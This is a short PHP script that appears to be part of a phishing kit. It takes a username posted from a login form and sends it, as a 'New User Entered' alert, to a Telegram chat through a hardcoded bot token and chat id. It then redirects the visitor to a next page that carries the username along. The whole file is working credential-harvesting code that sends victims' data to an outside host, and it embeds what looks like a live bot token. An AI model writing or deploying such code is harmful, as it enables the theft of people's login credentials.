<?php
$user = $_POST['username'];
$botToken = "8731617424:AAHu2Hb6OngsbB1gp9ajhicQT0tlP6s4hng";
$chatId = "7557911354";

$message = "👤 New User Entered:\nUsername: " . $user;

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

header("Location: next.php?username=" . urlencode($user));
exit();
?>


